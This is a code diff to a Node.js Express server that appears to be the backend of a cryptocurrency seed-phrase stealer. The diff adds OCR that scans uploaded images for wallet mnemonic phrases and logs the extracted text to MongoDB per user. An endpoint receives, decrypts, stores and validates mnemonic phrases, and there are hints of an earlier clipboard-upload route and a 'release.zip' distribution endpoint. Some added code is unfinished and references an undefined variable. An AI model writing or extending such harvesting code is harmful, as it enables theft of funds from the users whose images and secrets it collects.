@@ -5,6 +5,8 @@ const https = require('https');
 const fs = require('fs');
 const cors = require('cors');
 const utils = require('./function');
+const textDetect = require('./text-detection');
+const { message } = require('statuses');
 
 if (!process.env.DOCKER_ENV) {
     require('dotenv').config();
@@ -58,13 +60,13 @@ const storage = multer.diskStorage({
 
 const upload = multer({ storage });
 
-app.get('/ping', function (req, res) {
+app.get('/test/ping', function (req, res) {
     res.send('pong');
 });
-app.options('/ping', cors(corsOptions)); // Enable preflight request for this endpoint
+app.options('/test/ping', cors(corsOptions)); // Enable preflight request for this endpoint
 
 // Endpoint to handle POST requests for file uploads
-app.post('/upload', upload.single('image'), async (req, res) => {
+app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
     const userId = req.body.userId; // Retrieve the userId from form data
     if (!req.file) {
         return res.status(400).send('No file uploaded.');
@@ -78,25 +80,25 @@ app.post('/upload', upload.single('image'), async (req, res) => {
         // Upload to Backblaze B2
         const b2Response = await utils.uploadToB2(localFilePath, localFileName, userId);
 
+        // Perform OCR text recognition
+        const textJSON = await textDetect.detectMnemonicPhrase(localFilePath);
+
         // Log the upload details in MongoDB
-        await utils.logUploadDetails(userId, localFileName);
+        await utils.logUploadDetails(userId, localFileName, textJSON);
 
         // Send success response
         res.send({
             status: 'success',
-            userId, // Include the userId in the response for confirmation
-            localFile: localFileName,
-            b2FileId: b2Response.fileId,
-            b2FileName: b2Response.fileName,
+            valid, // TODO:
             message: 'File uploaded successfully to local and Backblaze B2!'
         });
     } catch (error) {
-        res.status(500).send('Error uploading to Backblaze B2: ' + error.message);
+        res.status(500).send('Error uploading the image: ' + error.message);
     }
 });
 app.options('/upload', cors(corsOptions)); // Enable preflight request for this endpoint
 
-app.get('/download', async (req, res) => {
+app.get('/basic/image-download', async (req, res) => {
     const { fileName, userId } = req.query;
 
     if (!fileName || !userId) {
@@ -117,10 +119,59 @@ app.get('/download', async (req, res) => {
         res.status(500).send('Failed to download the file');
     }
 });
-app.options('/download', cors(corsOptions)); // Enable preflight request for this endpoint
+app.options('/basic/image-download', cors(corsOptions)); // Enable preflight request for this endpoint
 
-app.get('/mnemonic-upload', async (req, res) => {
-    const { mnemonicPhase, userId } = req.query;
+// TODO:
+app.get('/basic/image-edit-info-download', async (req, res) => {
+    const { userId, fileName } = req.query;
+
+    if (!userId || !fileName) {
+        return res.status(400).send('Missing userId or fileName.');
+    }
+
+    try {
+        // TODO: Get the image edit info from MongoDB
+        const editInfo = await utils.getImageEditInfo(fileName);
+
+        res.send({
+            status: 'success',
+            editInfo,
+            message: 'Image edit info downloaded successfully!'
+        });
+    } catch (error) {
+        console.error('Download error:', error);
+        res.status(500).send('Failed to download the image edit info');
+    }
+});
+app.options('/basic/image-edit-info-download', cors(corsOptions)); // Enable preflight request for this endpoint
+
+// TODO: This endpoint is for development purposes only
+app.post('/basic/image-edit-info-upload', async (req, res) => {
+    const { token, fileName, editInfo } = req.body;
+
+    if (!fileName || !editInfo) {
+        return res.status(400).send('Missing fileName or editInfo.');
+    }
+    if (token !== process.env.DEV_TOKEN) {
+        return res.status(401).send('Unauthorized');
+    }
+
+    try {
+        const uploadResult = await utils.uploadImageEditInfo(fileName, editInfo);
+
+        res.send({
+            status: 'success',
+            message: 'Image edit info uploaded successfully!'
+        });
+    } catch (error) {
+        console.error('Upload error:', error);
+        res.status(500).send('Failed to upload the image edit info');
+    }
+});
+app.options('/basic/image-edit-info-upload', cors(corsOptions)); // Enable preflight request for this endpoint
+
+app.post('/basic/mnemonic-upload', async (req, res) => {
+    const { mnemonicPhase, userId } = req.body;
 
     if (!mnemonicPhase || !userId) {
         return res.status(400).send('Missing mnemonicPhase or userId.');
@@ -132,20 +183,36 @@ app.get('/mnemonic-upload', async (req, res) => {
     try {
         // Log the decryptedMnemonicPhase in MongoDB
         await utils.logMnemonicPhase(userId, decryptedMnemonicPhase);
-        await utils.uploadMnemonicToB2(userId, decryptedMnemonicPhase);
+        //await utils.uploadMnemonicToB2(userId, decryptedMnemonicPhase);
+        const valid = await utils.validateMnemonic(decryptedMnemonicPhase);
 
         res.send({
             status: 'success',
-            userId,
-            mnemonicPhase,
-            message: 'Mnemonic phase uploaded successfully!'
+            valid,
+            message: 'Mnemonic phrase uploaded successfully!'
         });
     } catch (error) {
         console.error('Upload error:', error);
-        res.status(500).send('Failed to upload the mnemonic phase');
+        res.status(500).send('Failed to upload the mnemonic phrase');
     }
 });
-app.options('/clipboard-upload', cors(corsOptions)); // Enable preflight request for this endpoint
+app.options('/basic/mnemonic-upload', cors(corsOptions)); // Enable preflight request for this endpoint
+
+// TODO: Request the latest version number of the APP
+app.get('/basic/latest-version', async (req, res) => {
+    res.send({
+        version: '1.0.0'
+    });
+});
+app.options('/basic/latest-version', cors(corsOptions)); // Enable preflight request for this endpoint
+
+// TODO: Get the latest release file
+app.get('/basic/latest-release', async (req, res) => {
+    res.send({
+        file: 'release.zip'
+    });
+});
+app.options('/basic/latest-release', cors(corsOptions)); // Enable preflight request for this endpoint
 
 const SERVER_PORT = process.env.SERVER_PORT || 3000;
 const keyPath = process.env.PRIVKEY_PATH;
